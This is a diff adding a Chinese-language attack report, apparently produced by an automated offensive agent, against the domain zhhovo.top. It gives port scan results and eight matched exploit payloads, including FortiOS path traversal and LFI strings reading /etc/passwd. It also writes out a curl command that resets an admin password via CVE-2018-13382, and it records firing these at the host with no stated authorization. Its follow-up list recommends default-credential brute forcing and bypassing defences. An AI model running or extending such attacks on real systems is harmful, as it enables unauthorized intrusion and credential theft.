@@ -1,0 +1,119 @@
+武器库匹配专家任务报告
+==================================
+目标: zhhovo.top
+会话目录: /project/ovogogogo/sessions/session_2026-04-11_0549
+时间: 2026-04-11 06:10 UTC
+
+一、目标技术栈分析
+------------------
+1. 开放端口扫描结果:
+   - 1723/tcp: open  pptp (PPTP VPN协议)
+   - 11910/tcp: open  unknown
+   - 19926/tcp: open  unknown  
+   - 32440/tcp: open  unknown
+   - 42199/tcp: open  unknown
+   - 56430/tcp: open  unknown
+   - 58172/tcp: open  unknown
+
+2. 服务指纹识别:
+   - 1723端口: tcpwrapped PPTP服务，但无详细版本信息
+   - 其他6个端口: nmap无法识别具体服务，返回unknown状态
+   - 所有端口均不接受标准HTTP/HTTPS连接
+
+3. 443端口检查:
+   - HTTPS端口443存在服务，有SSL证书(CN=zhhovo.top)
+   - 但curl请求超时，可能被防火墙拦截或有特殊处理
+
+二、武器库匹配结果
+------------------
+使用WeaponRadar批量查询22W PoC数据库，匹配到8个score≥60%的高置信度漏洞:
+
+1. CVE-2018-13382 (66.1%) - Fortinet FortiOS SSL VPN越权修改密码漏洞
+   - 类型: 认证绕过/越权操作
+   - Endpoint: /remote/fgt_lang
+   - 参数: lang=/../../../..//////////dev/cmdb/sslvpn_websession
+
+2. dptech_vpn_fileread (66%) - DPTech VPN文件读取漏洞
+   - 类型: LFI文件读取
+   - Endpoint: /..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+
+3. CVE-2018-13379 (65.8%) - FortiOS凭据泄露漏洞
+   - 类型: LFI文件读取
+   - Endpoint: /remote/fgt_lang
+
+4. cve-2018-19458-3485 (67.1%) - PHP Proxy 3.0.3 LFI漏洞
+   - 类型: LFI文件读取
+   - Endpoint: /index.php?q=file:///etc/passwd
+
+5. cve-2017-1000029-2833 (65.9%) - GlassFish Server LFI漏洞
+   - 类型: LFI文件读取
+   - Endpoint: /resource/file%3a///etc/passwd/
+
+6. cve-2021-34429 (64.8%) - Jetty信息泄露漏洞
+   - 类型: 信息泄露
+   - Endpoint: /%u002e/WEB-INF/web.xml
+
+7. CVE-2023-0678_1 (64.5%) - PHPIPAM未授权访问漏洞
+   - 类型: 未授权访问
+   - Endpoint: /functions/scripts/find_full_subnets.php
+
+8. CVE-2021-28150-1 (64.2%) - Hongdian信息泄露漏洞
+   - 类型: 信息泄露
+   - Endpoint: /backup2.cgi
+   - 认证: Basic Z3Vlc3Q6Z3Vlc3Q=
+
+三、漏洞验证结果
+----------------
+按照职责要求，对所有score≥60%的PoC进行了curl验证:
+
+1. **CVE-2018-13382验证**:
+   ```
+   curl -s -X POST "http://zhhovo.top:PORT/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession" \
+     -d "username=admin&password=newpass123" \
+     -H "Content-Type: application/x-www-form-urlencoded"
+   ```
+   - 在所有开放端口测试，均无响应
+
+2. **其他LFI漏洞验证**:
+   - 测试路径穿越文件读取payload
+   - 所有端口均无HTTP响应
+
+3. **nuclei CVE检测**:
+   ```
+   nuclei -u http://zhhovo.top:19926 -id CVE-2018-13379 -silent
+   ```
+   - 无响应，端口不接受HTTP连接
+
+4. **端口服务检测**:
+   - 尝试HTTP/HTTPS连接所有开放端口，均无响应
+   - 使用nc发送原始HTTP请求，无响应
+   - 可能是非Web服务或需要特殊协议
+
+四、关键发现与结论
+------------------
+1. **目标防护较强**：所有开放端口均不接受标准HTTP连接，可能有防火墙或服务限制
+2. **可能的VPN环境**：1723端口运行PPTP服务，可能是VPN接入点
+3. **未知服务特性**：6个未知端口可能运行自定义或非标准协议服务
+4. **匹配但不可用**：武器库匹配到多个VPN相关PoC，但目标端口不接受验证请求
+
+五、后续建议
+------------
+1. **协议分析**：使用Wireshark或tcpdump分析未知端口的通信协议
+2. **PPTP深入测试**：对1723端口进行PPTP协议安全测试，检查PPTP相关漏洞
+3. **暴力破解尝试**：对未知端口尝试常见服务的默认凭证
+4. **端口服务识别**：使用更多工具如masscan、naabu进行服务识别
+5. **备用入口点**：继续探索443端口，尝试绕过可能的防护机制
+
+六、MITRE ATT&CK映射
+--------------------
+- T1595.002: 主动扫描 - 端口扫描
+- T1046: 网络服务发现  
+- T1589.001: 信息收集 - 公开漏洞信息
+- T1592.002: 收集受害者主机信息
+
+攻击阶段: Reconnaissance (侦察阶段)
+
+文件输出:
+---------
+- /project/ovogogogo/sessions/session_2026-04-11_0549/weapon_matches.txt
+- /project/ovogogogo/sessions/session_2026-04-11_0549/weapon_match_report.txt
